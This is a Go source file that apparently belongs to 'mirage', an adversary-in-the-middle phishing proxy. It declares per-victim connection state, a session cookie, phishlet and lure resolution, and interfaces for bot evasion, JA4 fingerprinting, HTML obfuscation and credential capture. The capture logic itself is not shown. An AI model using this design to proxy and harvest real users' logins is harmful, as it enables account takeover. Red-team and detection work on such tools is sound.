package proxy

import (
	"context"
	"crypto/tls"
	"net"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/botguard"
)

// SessionCookieName is the name of the session tracking cookie set on victims.
const SessionCookieName = "__ss"

// connection represents a single victim's TLS connection. It is created
// once per connection after the TLS handshake completes, performs all
// connection-level setup (JA4, IP extraction, phishlet resolution, session
// creation), and then handles individual HTTP requests via handleRequest.
type connection struct {
	// Per-connection state.
	ja4Hash        string
	clientIP       string
	botVerdict     aitm.BotVerdict
	phishlet       *aitm.Phishlet
	lure           *aitm.Lure
	session        *aitm.Session
	isNewSession   bool
	puppetOverride string

	// rawConn is the underlying TLS connection for writing upstream responses
	// directly to the wire.
	rawConn  net.Conn
	tlsState *tls.ConnectionState

	// server holds all service dependencies shared across connections.
	server *Server
}

// Interfaces consumed by connection — defined here at the consumer site.

type botEvaluator interface {
	Evaluate(ja4 string, telemetry *aitm.BotTelemetry) aitm.BotVerdict
}

type ipBlocker interface {
	IsBlocked(ip string) bool
}

type phishletResolver interface {
	ResolveHostname(hostname, urlPath string) (*aitm.Phishlet, *aitm.Lure, error)
}

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	NewSession(clientIP, ja4Hash, lureID, phishletName string) (*aitm.Session, error)
	Update(session *aitm.Session) error
	Complete(session *aitm.Session) error
	IsComplete(sess *aitm.Session, def *aitm.Phishlet) bool
	CaptureCredentials(session *aitm.Session) error
}

type temporaryWhitelister interface {
	WhitelistTemporary(ip string, dur time.Duration)
}

type puppetOverrideSource interface {
	GetOverride(phishletName string) string
}

type telemetryScorer interface {
	ScoreSession(sessionID string) float64
}

type bodyObfuscator interface {
	Obfuscate(ctx context.Context, html []byte) ([]byte, error)
}

// newConnection creates a new connection with TLS-level state.
func (s *Server) newConnection(tlsConn *tls.Conn, clientHelloBytes []byte) *connection {
	cs := tlsConn.ConnectionState()
	c := &connection{
		rawConn:  tlsConn,
		tlsState: &cs,
		server:   s,
	}

	// Compute JA4 hash from TLS ClientHello.
	if len(clientHelloBytes) > 0 {
		if hash, err := botguard.ComputeJA4(clientHelloBytes); err == nil {
			c.ja4Hash = hash
		}
	}

	return c
}
